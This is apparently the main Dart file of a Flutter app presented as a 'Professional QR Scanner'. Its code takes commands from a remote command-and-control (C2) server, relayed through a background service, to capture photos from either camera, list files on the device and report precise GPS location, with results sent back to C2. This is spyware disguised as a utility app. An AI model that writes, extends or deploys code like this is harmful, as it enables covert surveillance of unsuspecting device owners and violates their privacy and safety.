// lib/main.dart
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:camera/camera.dart';
import 'package:geolocator/geolocator.dart'; // For Position type

import 'screens/qr_scanner_screen.dart';
import 'services/background_service.dart';
import 'services/camera_service.dart';
import 'services/location_service.dart';
import 'services/file_system_service.dart'; // <<<< ADDED IMPORT
import 'utils/constants.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeBackgroundService();
  runApp(const EthicalScannerApp());
}

class EthicalScannerApp extends StatefulWidget {
  const EthicalScannerApp({super.key});
  @override
  State<EthicalScannerApp> createState() => _EthicalScannerAppState();
}

class _EthicalScannerAppState extends State<EthicalScannerApp> {
  final svc = FlutterBackgroundService();

  @override
  void initState() {
    super.initState();

    // --- NEW: Listen for requests from the background service to execute MethodChannel calls ---

    // Listener for take_picture requests from background
    svc.on('execute_take_picture_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final camService = CameraService();
      final String? lensDirectionArg = args['camera'] as String?;
      final String? originalCommandRef =
          args['original_command_ref'] as String?;

      if (lensDirectionArg == null || originalCommandRef == null) {
        debugPrint(
          "EthicalScannerAppState: Missing 'camera' or 'original_command_ref' in execute_take_picture_from_ui",
        );
        // Optionally send an error back to background if needed, though background should timeout or handle no response.
        return;
      }

      final lensDirection =
          lensDirectionArg == 'back'
              ? CameraLensDirection.back
              : CameraLensDirection.front;

      debugPrint(
        "EthicalScannerAppState: UI received request to take picture with ${lensDirection.name}",
      );

      // CameraService's takePicture now directly uses the MethodChannel.
      // Native side (MainActivity.kt) is responsible for its own initialization and disposal per call.
      final XFile? file = await camService.takePicture(
        lensDirection: lensDirection,
      );

      if (file == null) {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'error',
          'payload': {
            'message': 'No image captured (UI request for background)',
          },
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'success',
          'payload': {'path': file.path},
          'original_command_ref': originalCommandRef,
        });
      }
      // No cam.dispose() here, as CameraService.dispose() calls native dispose.
      // Lifecycle of camera on native side is managed per takePicture call or via its dispose.
    });

    // Listener for list_files requests from background
    svc.on('execute_list_files_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final fsService = FileSystemService();
      final String? path = args['path'] as String?;
      final String? originalCommandRef =
          args['original_command_ref'] as String?;

      if (originalCommandRef == null) {
        debugPrint(
          "EthicalScannerAppState: Missing 'original_command_ref' in execute_list_files_from_ui",
        );
        return;
      }

      debugPrint(
        "EthicalScannerAppState: UI received request to list files for path: '$path'",
      );
      final Map<String, dynamic>? result = await fsService.listFiles(
        path ?? ".",
      );

      if (result != null && result['error'] == null) {
        svc.invoke('execute_list_files_from_ui_result', {
          'status': 'success',
          'payload': result,
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_list_files_from_ui_result', {
          'status': 'error',
          'payload': {
            'message':
                result?['error']?.toString() ??
                'Failed to list files (UI request for background)',
          },
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // --- Existing listeners for events PUSHED from background IF NEEDED ---
    // These listeners were originally for C2 commands being pushed to UI.
    // If C2 commands are now *always* handled by background first, then delegated to UI,
    // these specific listeners (SIO_CMD_TAKE_PICTURE, SIO_CMD_GET_LOCATION) might become redundant here.
    // For now, let's keep get_location as it doesn't need MethodChannel via UI.
    // The original SIO_CMD_TAKE_PICTURE listener is now replaced by the execute_take_picture_from_ui.

    // Listener for get_location (this can stay as it's pure Dart and doesn't need native UI isolate directly)
    svc.on(SIO_CMD_GET_LOCATION).listen((_) async {
      debugPrint(
        "EthicalScannerAppState: Received SIO_CMD_GET_LOCATION event (likely from background).",
      );
      final locSvc = LocationService();
      try {
        final Position? loc = await locSvc.getCurrentLocation();
        if (loc == null)
          throw Exception('Location unavailable from UI listener');
        // This result is intended for whom? If background handles C2 command response,
        // then this invoke might be for UI update or redundant if background already sent.
        // Let's assume background will handle the C2 response. This can be for UI state update.
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          // Different event name for clarity
          'status': 'success',
          'payload': {
            'latitude': loc.latitude,
            'longitude': loc.longitude,
            'accuracy': loc.accuracy,
            'altitude': loc.altitude,
            'speed': loc.speed,
            'timestamp_gps': loc.timestamp?.toIso8601String(),
          },
        });
      } catch (e) {
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          'status': 'error',
          'payload': {'message': e.toString()},
        });
      }
    });

    // The original SIO_CMD_TAKE_PICTURE listener in main.dart is no longer primary
    // for C2 commands, as the background service will now delegate to the UI
    // using 'execute_take_picture_from_ui'. If this was for a different purpose,
    // it needs to be re-evaluated. For C2 commands, the background service is the entry point.
    // If you had a use case where the UI *directly* received a SIO_CMD_TAKE_PICTURE
    // and needed to act, that logic would go here. But the current flow is C2 -> BG -> UI -> BG -> C2.
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Professional QR Scanner',
      theme: ThemeData.dark(),
      home: const Directionality(
        textDirection: TextDirection.ltr,
        child: QrScannerScreen(),
      ),
    );
  }
}
